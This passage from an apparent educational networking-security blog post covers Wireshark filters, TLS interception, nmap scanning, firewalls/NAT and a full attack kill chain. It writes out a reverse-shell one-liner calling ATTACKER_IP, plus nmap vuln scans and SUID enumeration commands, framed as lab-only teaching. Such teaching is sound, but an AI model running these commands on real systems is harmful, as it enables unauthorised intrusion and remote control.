         timestamp                                            [S]=SYN (handshake start)
```

Flag letters: `S`=SYN, `.`=ACK, `P`=PSH (data), `F`=FIN (close), `R`=RST (reset).

### Wireshark — the graphical analyzer

Same captures, but with a GUI, deep protocol decoding, and powerful filters. The usual split: tcpdump to capture (especially on servers), Wireshark to analyze. There are two filter types — don't confuse them:

| Type | When | Example |
|------|------|---------|
| Capture filter | Before capture, limits what's recorded (BPF syntax, like tcpdump) | `port 443` |
| Display filter | After capture, filters the view (Wireshark syntax) | `http.request.method == "GET"` |

Essential display filters:

```
ip.addr == 192.168.1.1          # traffic to/from a host
tcp.port == 443                 # a port
http                            # only HTTP
dns                             # only DNS
tcp.flags.syn == 1              # SYN packets
arp                             # ARP traffic (watch for spoofing!)
http.request                    # HTTP requests only
tcp.analysis.retransmission     # signs of packet loss
```

The killer feature is **Follow Stream**: right-click any packet → Follow → TCP Stream reassembles the whole conversation into readable text. For an HTTP site I literally see the full request and response, including any plaintext passwords. It's the single most powerful demo of why HTTP is dangerous and HTTPS matters.

### Security uses

- **Credential capture** on plaintext protocols (HTTP, FTP, Telnet) — proves why encryption is mandatory.
- **Detecting ARP spoofing** — filter `arp`, watch for an IP's MAC suddenly changing or duplicate replies.
- **Malware / C2 analysis** — spot beaconing, DNS tunneling, exfiltration.
- **Troubleshooting** — see retransmissions, resets, failed handshakes.

## TLS / HTTPS

How traffic gets encrypted, the certificate chain of trust, and why attackers can't just read it (and how interception proxies get around it).

HTTPS = HTTP inside an encrypted TLS tunnel. A sniffer on the wire (the previous chapter) sees only scrambled bytes — that's the whole point.

### What TLS provides

| Guarantee | Meaning | Without it... |
|-----------|---------|---------------|
| Confidentiality | Traffic is encrypted | Anyone sniffing reads everything |
| Integrity | Tampering is detected | A MITM could alter data in transit |
| Authentication | I'm really talking to the real server | I could be on a phishing clone |

### Combining two kinds of crypto

TLS solves a chicken-and-egg problem: how do two strangers agree on a secret key over a wire an attacker is watching?

- **Asymmetric** (public/private key) — slow, but lets strangers establish trust without sharing a secret first. Used only at the start, to authenticate the server and securely agree on a key.
- **Symmetric** (one shared key) — fast. Used for the actual data once the key is agreed.

```
Start: use SLOW asymmetric crypto -> safely agree on a shared key
Then:  use FAST symmetric crypto with that key -> encrypt all data
```

### The TLS handshake (simplified)

```
CLIENT                                          SERVER
  |                                                |
  | -- ClientHello -------------------------->     |  "I support these ciphers;
  |    (TLS versions, cipher suites, random)        |   here's my random"
  |                                                |
  | <-- ServerHello + CERTIFICATE -----------      |  "Chosen cipher + here's my
  |     (chosen cipher, server random, cert)        |   certificate (public key,
  |                                                |   signed by a CA)"
  |                                                |
  |  [Client verifies the certificate chain]        |
  |                                                |
  | -- key exchange ------------------------->     |  Both derive the same
  | <-- Finished ----------------------------       |  shared symmetric key
  |                                                |
  | === ENCRYPTED APPLICATION DATA (symmetric) ===  |
```

(TLS 1.3 streamlines this to one round trip and drops old, weak options.)

### The certificate chain of trust

How does my browser know the certificate is genuinely Google's and not a forgery? A signature chain anchored in trust my OS/browser already holds:

```
ROOT CA (e.g. ISRG, DigiCert)      <- pre-installed & trusted by my device
in the OS/browser "trust store"
        | signs
INTERMEDIATE CA
        | signs
SERVER CERT (google.com)           <- presented in the handshake
```

The browser verifies that each cert is signed by the one above it, up to a Root CA it already trusts. It also checks that the cert's name matches the domain, that it isn't expired, and that it isn't revoked. Any failure → the scary "Your connection is not private" warning.

### Why attackers can't just read HTTPS — and how proxies get around it

A **passive sniffer** fails because the data is symmetric-encrypted with a key negotiated using asymmetric crypto. The attacker never sees the private key, so they see only ciphertext.

A **basic MITM** fails because if the attacker swaps in their own certificate for `google.com`, it isn't signed by a trusted CA (they can't forge a CA signature) → the browser screams. This is exactly why HTTPS defeats the ARP-spoofing MITM from earlier — they can reroute my traffic but can't decrypt or convincingly impersonate it.

**Interception does work** with TLS-inspection proxies (Burp Suite, mitmproxy, corporate firewalls) by *terminating TLS in the middle*:

```
Me --TLS#1--> PROXY --TLS#2--> Real Server
                ^
   proxy presents ITS OWN cert to me,
   and I must TRUST the proxy's CA
```

The catch: I (or an admin) must install the proxy's CA certificate into the trust store first. Once that root is trusted, the proxy's forged certs pass validation and it can read everything. This is legitimate for pentesters debugging an app (Burp) or companies inspecting employee traffic — and it's exactly why you should **never install an unknown root CA**: it hands someone the power to silently MITM all your HTTPS.

### Hands-on

```
# Inspect a site's certificate from the terminal
openssl s_client -connect google.com:443 -servername google.com

# Show cert details (issuer, validity, SANs)
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -text

# Check expiry date only
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates

# Which TLS versions/ciphers does a server support?
nmap --script ssl-enum-ciphers -p 443 google.com
```

## Scanning with nmap ★

Mapping a target: what's open, what software + version it runs. The recon phase.

The recon phase. Before attacking (or defending) anything, you map it: which hosts are alive, what ports are open, what software and version runs behind them. Nmap is the industry-standard tool — it picks up where the **Open Ports** chapter left off.

### The recon workflow nmap covers

```
1. HOST DISCOVERY   ->  which IPs are alive?      (-sn)
2. PORT SCANNING    ->  which ports are open?     (-sS, -p)
3. SERVICE/VERSION  ->  what software + version?  (-sV)
4. OS DETECTION     ->  what operating system?    (-O)
5. DEEPER ENUM      ->  scripts for vulns/info    (-sC, --script)
```

### Scan types

| Flag | Name | How it works | Why |
|------|------|--------------|-----|
| `-sS` | SYN / "half-open" | Sends SYN, sees SYN-ACK, sends RST (never completes) | Fast, stealthy. Default with sudo. |
| `-sT` | TCP connect | Completes the full 3-way handshake | When you lack raw-socket/root privileges |
| `-sU` | UDP scan | Probes UDP ports | Finds DNS/SNMP/DHCP; slow |
| `-sn` | Ping scan | Host discovery only, no port scan | "What's alive on this subnet?" |
| `-Pn` | No ping | Skip host discovery, assume up | When targets block ping |

### The commands you'll actually use

```
# Discover live hosts on the network
nmap -sn 192.168.1.0/24

# Quick scan of common 1000 ports
nmap 192.168.1.10

# Scan specific ports / ranges
nmap -p 22,80,443 192.168.1.10
nmap -p 1-1000 192.168.1.10

# Scan ALL 65535 ports
nmap -p- 192.168.1.10

# Service + version detection (the key recon step)
nmap -sV 192.168.1.10

# Default scripts + version (great all-rounder)
nmap -sC -sV 192.168.1.10

# Aggressive: OS detection, version, scripts, traceroute
nmap -A 192.168.1.10

# Stealthy SYN scan + versions + OS (needs sudo)
sudo nmap -sS -sV -O 192.168.1.10

# Control speed: -T0 (paranoid/slow) ... -T5 (insane/fast)
nmap -T4 192.168.1.10

# Run a vuln-detection script category
nmap --script vuln 192.168.1.10

# Save output in all formats
nmap -A -oA scan_results 192.168.1.10
```

### Reading the output

```
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 7.6p1 Ubuntu   <- old? check CVEs
80/tcp   open     http      Apache httpd 2.4.29    <- enumerate the web app
443/tcp  open     ssl/http  Apache httpd 2.4.29
3306/tcp open     mysql     MySQL 5.7.33           <- DB exposed — should it be?
8080/tcp filtered http-proxy                       <- firewall dropping probes
```

- `open` → a service is listening (attack surface)
- `closed` → host alive, nothing on that port
- `filtered` → a firewall is silently dropping the probes

The version string is gold: knowing `OpenSSH 7.6` or `Apache 2.4.29` lets me look up known CVEs for that exact version. Recon → vulnerability research → exploitation. For defenders, the same output shows what's exposed and what's outdated.

### The Nmap Scripting Engine (NSE)

Nmap runs Lua scripts that go beyond port scanning — banner grabbing, vuln checks, brute force, enumeration:

```
nmap --script ssl-enum-ciphers -p 443 target   # TLS config audit
nmap --script smb-enum-shares -p 445 target     # list Windows shares
nmap --script http-title -p 80 target           # grab web page titles
nmap --script vuln target                        # known-vuln checks
```

Scripts live in categories: `default`, `safe`, `intrusive`, `vuln`, `auth`, `discovery`, `brute`.

> Ethics & legal: sniffing networks you don't own, intercepting others' TLS, and scanning hosts without written permission are illegal in most jurisdictions. Practice only on your own machines/network or sanctioned labs (TryHackMe, Hack The Box, Metasploitable, your own VMs).

---

# Putting It Together

## Firewalls & NAT Defense

How traffic gets blocked or allowed (on the 5-tuple) — and why reverse shells dial outward to beat them.

A firewall's entire job is to decide, for every packet: allow or block? It makes that decision based on the **5-tuple** (protocol, source IP, source port, destination IP, destination port) from the **TCP/UDP** chapter. Understanding this is what makes the reverse-shell trick later click into place.

### What a firewall actually does

A firewall sits at a boundary (my laptop, a router, a network edge) and checks every packet against an *ordered* list of rules. Each rule matches on parts of the 5-tuple and says ACCEPT or DROP/REJECT.

```
Packet arrives -> Rule 1: match? -> Rule 2: match? -> ... -> DEFAULT POLICY
                    | yes              | yes                    | (usually DROP)
                 ACCEPT/DROP        ACCEPT/DROP
```

Two design facts matter most:

- Rules are **ordered** — first match wins.
- The **default policy** is the whole game. A secure firewall is *default-DROP*: block everything, then explicitly allow only what's needed (a default-deny allowlist).

And there are two ways to say "no":

| Action | Behavior | Effect on a scanner |
|--------|----------|---------------------|
| DROP | Silently discard, no reply | Port shows as `filtered` — attacker can't even tell it exists |
| REJECT | Refuse with an error (RST/ICMP) | Port shows `closed` — attacker knows the host is alive |

### Stateless vs stateful

| | Stateless | Stateful |
|---|-----------|----------|
| Decision basis | Each packet in isolation | Tracks whole connections |
| Knows about handshakes? | No | Yes — remembers the 5-tuple of established connections |
| Reply traffic | Must be allowed by an explicit rule | Automatically allowed because it belongs to a connection I started |

Modern firewalls are **stateful** — they keep a connection table of the 5-tuples of active sessions. This is why I can browse the web freely: I initiated the connection outbound, so the firewall remembers it and lets Google's replies back in without an inbound rule. That's the key that makes reverse shells work below.

### NAT — defense by accident

NAT was invented to solve the IPv4 shortage (many devices sharing one public IP, the **NAT** chapter earlier), but it doubles as a firewall-like barrier.

```
INSIDE (private)             ROUTER/NAT           OUTSIDE (internet)
192.168.1.34:51324  ----> 203.0.113.5:40000  ----> 142.250.182.14:443
192.168.1.40:52001  ----> 203.0.113.5:40001  ----> ...
      |                        |
 private IPs              one public IP, rewrites source IP+port,
 (not routable)           keeps a translation table
```

The NAT device keeps a translation table mapping inside `IP:port` ↔ public `IP:port`. When a reply comes back to `203.0.113.5:40000`, it looks up the table and forwards it to `192.168.1.34:51324`.

Why NAT blocks inbound attacks: an attacker who sends a packet to `203.0.113.5:40000` out of the blue hits a NAT table with *no entry* for that unsolicited inbound connection → the router has nothing to translate it to → dropped.

```
Internet -> my laptop directly:  blocked (no NAT mapping exists)
My laptop -> internet -> reply:  works (mapping created when I sent out)
```

(Deliberate exceptions: **port forwarding** manually maps a public port to an internal host — e.g. to run a game server. Each forward is also a hole in the defense.)

### The defender's takeaway

The combination — stateful firewall + NAT, both default-deny on inbound — means unsolicited inbound connections are blocked, and only traffic belonging to connections initiated from inside is allowed. That's the default posture of nearly every home and corporate network.

```
# See the macOS packet filter firewall (pf)
sudo pfctl -s rules

# Linux: list firewall rules
sudo iptables -L -n -v          # legacy
sudo nft list ruleset           # modern nftables
sudo ufw status verbose         # Ubuntu's simple frontend
```

### Why reverse shells dial outward to beat all this

This is the punchline that ties firewalls, NAT, and stateful tracking together. The attacker's problem: they've found a vulnerability and can run a command on a victim behind a firewall + NAT, and they want a shell. But:

```
BIND SHELL (the naive approach):
  victim opens a listening port, attacker connects IN
  Attacker ---- connect inbound ---X  [FIREWALL/NAT blocks it]  Victim:4444
  -> FAILS. Inbound is denied. No NAT mapping. Dead.

REVERSE SHELL (flip the direction):
  attacker listens; VICTIM connects OUT to the attacker
  Attacker:443 <---- victim dials outbound ----  Victim
  -> WORKS. Outbound is allowed (default), NAT creates a mapping,
     stateful firewall remembers it, replies flow freely.
```

Why it defeats the defenses:

- Firewalls/NAT block inbound but freely allow outbound (you can't browse otherwise).
- The victim *initiating* the connection creates the NAT mapping + stateful table entry — so the return traffic (the attacker's commands) is treated as legitimate "reply" traffic.
- Attackers pick ports like `443` so the outbound connection blends in with normal HTTPS and survives even stricter egress filtering.

```
# Classic demo (LAB ONLY, machines you own):
# Attacker listens:
nc -lvnp 443
# Victim connects back and hands over a shell:
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

The defender's counter is **egress filtering** — restrict *outbound* traffic too (only allow outbound to known destinations/ports), plus monitor for unexpected outbound connections. Most networks neglect this, which is exactly why reverse shells are so reliable.

## The Attack Flow

Recon → Scan → Find the weak door → Get in. How every chapter above connects to real hacking.

Every topic so far is a *tool*. This is the methodology that chains them into a real intrusion. The standard model: Recon → Scan → Find the weak door → Get in → (Escalate → Persist → Pivot).

### The full kill chain

```
1. RECON      ->  2. SCAN       ->  3. FIND THE   ->  4. GET IN
   (passive)         (active)          WEAK DOOR        (exploit)
   Who/what is       What ports/       Which service    Reverse
   the target?       versions?         is vulnerable?   shell / creds
                                                            |
   +--------------------------------------------------------+
   v
5. ESCALATE   ->  6. PERSIST    ->  7. PIVOT /
   low -> root       keep access       EXFILTRATE
   (SUID/sudo)       (backdoor)        spread/loot
```

### Stage by stage — and which chapter does it

**Stage 1 — Recon.** Gather information before touching the target loudly. *Passive*: public info — DNS records (`dig`, `whois`), search engines, leaked data, the company website; the target never knows. *Active*: light probing — ping, identifying live hosts (`nmap -sn`). Goal: know the IP ranges, domains, and surface that exists.

**Stage 2 — Scan.** Map the live target in detail: host discovery (`nmap -sn 192.168.1.0/24`), port scanning for open/listening doors (`nmap -sS -p-`), and service + version detection (`nmap -sV`). Output: a list like `22/ssh OpenSSH 7.6`, `80/http Apache 2.4.29`, `445/smb`.

**Stage 3 — Find the weak door.** Turn the scan into a target. For each open service: look up the exact version against CVE databases / Exploit-DB; check for outdated software with known exploits, default/weak credentials, misconfigurations, exposed admin panels, and web-app flaws (OWASP Top 10: SQLi, etc.). Wireshark and Burp help inspect how a service actually behaves. Goal: pick the single highest-probability entry point.

**Stage 4 — Get in.** Exploit the chosen weakness to gain code execution — run an exploit, abuse weak creds, or trick the app. The common payload is a **reverse shell** dialing back out through the firewall/NAT (the previous chapter). Result: a foothold, usually as a low-privileged user.

**Stage 5 — Privilege escalation.** Go from low-priv user to root/admin. Enumerate the box: misconfigured SUID binaries (`find / -perm -4000`), abusable sudo rules, weak file permissions, kernel exploits, readable credentials. A SUID-root binary or a permissive sudo rule is the local "door upward." Result: full control — now `/etc/shadow` and everything else is readable.

**Stage 6 — Persistence.** Keep access even after reboot/patch: backdoors, new accounts, cron jobs, SSH keys, a stashed SUID shell. Goal: don't have to re-exploit to get back in.

**Stage 7 — Pivot / exfiltrate.** Use this machine as a launchpad. *Pivot*: the compromised host can now reach internal machines the firewall/NAT hid from outside — repeat the whole flow from inside. *Exfiltrate*: steal data (often out over 443/DNS to blend in). *Loot*: harvest credentials to move laterally.

### How every chapter maps onto the flow

| Chapter | Where it's used in the attack |
|---------|-------------------------------|
| Layers / IP / NAT | Understand the network and why inbound is blocked |
| MAC / ARP | Local MITM, sniffing, ARP-spoof to capture traffic |
| DNS | Recon (records), spoofing to redirect victims |
| HTTP / TLS | Inspect & attack web apps; understand what's encrypted |
| Ports / TCP-UDP | Know what services exist; handshake → scan techniques |
| Open ports | The doors — scanning finds them |
| tcpdump / Wireshark | See traffic, grab plaintext creds, detect/verify |
| nmap | The entire Scan + version-detection stage |
| Firewalls / NAT | Why reverse shells beat the perimeter |
| Privilege escalation (SUID/sudo) | Stage 5 — low-priv → root |

### The defender's mirror image (Blue Team)

Every offensive stage has a defensive counter — this is how the two halves of security connect:

| Attacker does | Defender counters with |
|---------------|------------------------|
| Recon / scan | Minimize public info; IDS/IPS to detect scans |
| Find open ports | Close unused ports, firewall, reduce attack surface |
| Exploit a service | Patch (kill the CVE), least privilege, WAF |
| Reverse shell out | Egress filtering, outbound monitoring |
| Privilege escalation | Remove needless SUID/sudo, harden configs |
| Persistence / pivot | EDR, log monitoring, network segmentation (VLANs) |

> Ethics & legal: this methodology is taught for authorized penetration testing, defense, and labs only. Running any stage against systems you don't own or lack written permission to test is a crime in most countries. Practice on TryHackMe, Hack The Box, your own VMs, or sanctioned engagements.

---

# It All Connects

I started this post with one idea: networking is split into floors, each does one job, and every tool and every attack lives on one floor. Having filled in every chapter, here's the whole thing as a single thought.

A packet's journey *is* the syllabus. A name becomes an IP (**DNS**); the IP says *which machine* and the subnet mask says whether it's local or not (**IP Addresses**); inside the LAN, ARP turns that IP into a MAC for the actual hand-off (**MAC/ARP**); the port says *which program* and TCP or UDP carries it there, reliable or fast, after a handshake (**Ports**, **TCP/UDP**); on top rides the content — **HTTP** in the clear or wrapped in a **TLS** tunnel. NAT and a stateful **firewall** sit at the edge rewriting addresses and blocking anything inbound that nobody asked for (**NAT**, **Firewalls**). Every layer wraps the one above it — that's encapsulation, the single mechanic the whole stack runs on.

The security half is the same map read with intent. Whatever can be *seen* can be *captured* (**tcpdump/Wireshark**); whatever *listens* is a door (**Open Ports**), and **nmap** is how you find and fingerprint those doors. The recurring weakness is **trust without verification** — ARP believes any reply, classic DNS believes any answer, plain HTTP hides nothing — and the recurring fix is **cryptography that proves identity and scrambles content** (TLS), plus **default-deny at the edge**. That's why the **attack flow** runs Recon → Scan → Find the weak door → Get in → Escalate → Persist → Pivot, why a reverse shell dials *outward* to turn the firewall's own "outbound is fine" rule against it, and why every offensive move has a Blue-Team mirror. Learn the floors once and the acronyms stop being a pile — they become positions on a single map.

### The whole post, in one diagram

Four floors, each doing one job, each with its own address, its own protocols, and the tools and attacks that live there:

```
┌─────────────┬───────────────────┬───────────┬──────────────────┬─────────────────────┐
│ FLOOR       │ ITS ONE JOB       │ ADDRESS   │ LIVES HERE       │ TOOLS / ATTACKS     │
├─────────────┼───────────────────┼───────────┼──────────────────┼─────────────────────┤
│ Application │ what data means   │ names/URL │ HTTP DNS TLS     │ Burp, SQLi, XSS     │
│ Transport   │ which program     │ port      │ TCP UDP          │ nmap, SYN flood     │
│ Network     │ which machine     │ IP        │ IP NAT routing   │ ping, IP spoofing   │
│ Link        │ one physical hop  │ MAC       │ Ethernet ARP     │ tcpdump, ARP MITM   │
└─────────────┴───────────────────┴───────────┴──────────────────┴─────────────────────┘
```

And the same four floors as a packet actually travels them — down my stack, across the wire, up the server's — wrapping an envelope at every floor (encapsulation) and unwrapping it on the way up:

```
        I type  https://example.com
                      │
   ┌──────────────────▼───────────────────────────────────────────────┐
   │  MY MACHINE — request rides the elevator DOWN                      │
   │                                                                    │
   │   Application   HTTP "GET /"            (DNS first: name -> IP)     │
   │        │  wrap                                                     │
   │   Transport     + TCP header  ───────►  src/dst PORT, 3-way SYN    │
   │        │  wrap                                                     │
   │   Network       + IP header   ───────►  src/dst IP  (NAT rewrites) │
   │        │  wrap                                                     │
   │   Link          + Ethernet    ───────►  src/dst MAC (ARP: IP->MAC) │
   └──────────────────┬─────────────────────────────────────────────────┘
                      │
        bits on the wire ──►  my router (NAT + stateful firewall)
                      │              │  blocks unsolicited inbound
                      ▼              ▼
              ISP ──► internet ──► routers hop by hop ──► server's edge
                      │
   ┌──────────────────▼───────────────────────────────────────────────┐
   │  SERVER — each floor opens ONLY its own envelope, hands UP         │
   │   Link -> Network -> Transport -> Application                      │
   │   ...reads "GET /", builds the reply, and the whole trip reverses. │
   └────────────────────────────────────────────────────────────────────┘

   Defense lives at the edge; the attack flow walks the doors:
   Recon ─► Scan ─► Find the weak door ─► Get in ─► Escalate ─► Persist ─► Pivot
```

That single picture is the whole post: the left-to-right map says *where every acronym lives*, and the top-to-bottom journey says *how a message actually moves and where each tool and attack plugs in.*

---

*Living post — all fourteen chapters now filled in: Layers, IP Addresses, NAT, MAC/ARP, DNS, HTTP, Ports, TCP/UDP, Open Ports, tcpdump/Wireshark, TLS/HTTPS, nmap, Firewalls & NAT Defense, and The Attack Flow. From here it's depth, not coverage.*
